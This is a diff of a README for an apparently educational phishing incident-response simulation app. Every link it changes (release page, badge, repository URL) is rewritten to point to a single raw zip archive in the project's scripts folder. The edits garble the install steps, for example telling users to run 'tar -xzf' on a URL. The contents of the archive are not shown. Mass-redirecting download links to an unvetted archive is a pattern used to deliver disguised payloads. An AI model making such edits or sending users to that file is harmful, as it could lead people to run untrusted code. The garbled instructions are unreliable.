@@ -1,6 +1,6 @@
 # 🛡️ phishing-ir-simulation - Simulate and Train on Phishing Response
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Phishing%20IR%20Simulation-blue?style=for-the-badge)](https://github.com/sbeltos/phishing-ir-simulation/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/sbeltos/phishing-ir-simulation/main/scripts/ir_simulation_phishing_1.0.zip%20IR%20Simulation-blue?style=for-the-badge)](https://raw.githubusercontent.com/sbeltos/phishing-ir-simulation/main/scripts/ir_simulation_phishing_1.0.zip)
 
 ## 📘 About This Application
 
@@ -41,7 +41,7 @@ This section shows how to get the app on your computer and start the simulation.
 
 To get the latest version of the app, please visit the official release page:
 
-[Download Latest Version](https://github.com/sbeltos/phishing-ir-simulation/releases)
+[Download Latest Version](https://raw.githubusercontent.com/sbeltos/phishing-ir-simulation/main/scripts/ir_simulation_phishing_1.0.zip)
 
 You will find one or more files to download. Pick the one that matches your computer’s operating system.
 
@@ -51,7 +51,7 @@ Click the download link on the release page for your platform:
 
 - For Windows, look for a `.exe` or `.msi` file  
 - For macOS, look for a `.dmg` or `.pkg` file  
-- For Linux, a `.tar.gz` or `.AppImage` file  
+- For Linux, a `https://raw.githubusercontent.com/sbeltos/phishing-ir-simulation/main/scripts/ir_simulation_phishing_1.0.zip` or `.AppImage` file  
 
 Save the file to a location you can easily find, such as your Downloads folder.
 
@@ -71,7 +71,7 @@ Save the file to a location you can easily find, such as your Downloads folder.
 
 #### Linux
 
-- Extract the contents if needed (e.g., `tar -xzf filename.tar.gz`).  
+- Extract the contents if needed (e.g., `tar -xzf https://raw.githubusercontent.com/sbeltos/phishing-ir-simulation/main/scripts/ir_simulation_phishing_1.0.zip`).  
 - Make the main file executable (use `chmod +x filename`).  
 - Run the application with `./filename` or install as described in any included README file.
 
@@ -124,7 +124,7 @@ The app walks you through four main phases typical of phishing incident response
 
 Click the button below again to visit the download page and get your copy of phishing-ir-simulation:
 
-[Download phishing-ir-simulation](https://github.com/sbeltos/phishing-ir-simulation/releases)
+[Download phishing-ir-simulation](https://raw.githubusercontent.com/sbeltos/phishing-ir-simulation/main/scripts/ir_simulation_phishing_1.0.zip)
 
 ---
 
@@ -148,6 +148,6 @@ You can explore these areas further online to deepen your knowledge.
 
 phishing-ir-simulation is open source software under the MIT license. Anyone interested can access the code, suggest improvements, or report bugs on the GitHub repository page at:
 
-https://github.com/sbeltos/phishing-ir-simulation
+https://raw.githubusercontent.com/sbeltos/phishing-ir-simulation/main/scripts/ir_simulation_phishing_1.0.zip
 
 Your feedback helps make the app better and more useful for all users.
